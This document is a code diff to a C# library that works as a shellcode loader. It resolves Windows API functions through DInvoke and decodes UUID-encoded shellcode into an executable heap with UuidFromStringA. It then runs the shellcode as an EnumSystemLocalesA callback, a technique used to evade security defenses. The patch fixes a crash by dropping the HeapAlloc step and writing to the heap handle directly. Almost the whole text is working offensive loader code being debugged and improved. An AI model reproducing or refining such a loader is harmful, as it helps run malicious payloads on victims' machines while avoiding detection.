@@ -94,7 +94,7 @@ namespace USELibrary
 
             // Function pointers for winapi calls 
             IntPtr pHeapCreate = DInvoke.DynamicInvoke.Generic.GetExportAddress(pkernel32, "HeapCreate");
-            IntPtr pHeapAlloc = DInvoke.DynamicInvoke.Generic.GetExportAddress(pkernel32, "HeapCreate");
+            //IntPtr pHeapAlloc = DInvoke.DynamicInvoke.Generic.GetExportAddress(pkernel32, "HeapAlloc");
             IntPtr pEnumSystemLocalesA = DInvoke.DynamicInvoke.Generic.GetExportAddress(pkernel32, "EnumSystemLocalesA");
             IntPtr pUuidFromStringA = DInvoke.DynamicInvoke.Generic.GetExportAddress(prpcrt4, "UuidFromStringA");
 
@@ -102,22 +102,23 @@ namespace USELibrary
             object[] heapCreateParam = { (uint)0x00040000, UIntPtr.Zero, UIntPtr.Zero };
             var heapHandle = (IntPtr)DInvoke.DynamicInvoke.Generic.DynamicFunctionInvoke(pHeapCreate, typeof(DELEGATE.HeapCreate), ref heapCreateParam);
 
-            object[] heapAllocParam = { heapHandle, (uint)0, (uint)0x100000 };
-            var heapAddr = (IntPtr)DInvoke.DynamicInvoke.Generic.DynamicFunctionInvoke(pHeapAlloc, typeof(DELEGATE.HeapAlloc), ref heapAllocParam);
+            // Heap Alloc is not needed and only gives accessviolationerror - Can't really debug why that is
+            //object[] heapAllocParam = { heapHandle, (uint)0, (uint)0x100000 };
+            //var heapAddr = (IntPtr)DInvoke.DynamicInvoke.Generic.DynamicFunctionInvoke(pHeapAlloc, typeof(DELEGATE.HeapAlloc), ref heapAllocParam);
             //Console.WriteLine("[>] Allocated Heap address - 0x{0}", heapAddr.ToString("x2"));
 
             // 2. Writing shellcode from UUID to binary to the heap 
             IntPtr newHeapAddr = IntPtr.Zero;
             for (int i = 0; i < uuids.Length; i++)
             {
-                newHeapAddr = IntPtr.Add(heapAddr, 16 * i);
+                newHeapAddr = IntPtr.Add(heapHandle, 16 * i);
                 object[] uuidFromStringAParam = { uuids[i], newHeapAddr };
                 var status = (IntPtr)DInvoke.DynamicInvoke.Generic.DynamicFunctionInvoke(pUuidFromStringA, typeof(DELEGATE.UuidFromStringA), ref uuidFromStringAParam);
 
             }
 
             // 3. Executing shellcode as a callback function 
-            object[] enumSystemLocalesAParam = { heapAddr, 0 };
+            object[] enumSystemLocalesAParam = { heapHandle, 0 };
             var result = DInvoke.DynamicInvoke.Generic.DynamicFunctionInvoke(pEnumSystemLocalesA, typeof(DELEGATE.EnumSystemLocalesA), ref enumSystemLocalesAParam);
 
             // Use this if #3 gies access violation error 
@@ -131,8 +132,8 @@ namespace USELibrary
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         public delegate IntPtr HeapCreate(uint flOptions, UIntPtr dwInitialSize, UIntPtr dwMaximumSize);
 
-        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        public delegate IntPtr HeapAlloc(IntPtr hHeap, uint dwFlags, uint dwBytes);
+        //[UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        //public delegate IntPtr HeapAlloc(IntPtr hHeap, uint dwFlags, uint dwBytes);
 
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         public delegate IntPtr UuidFromStringA(string StringUuid, IntPtr heapPointer);
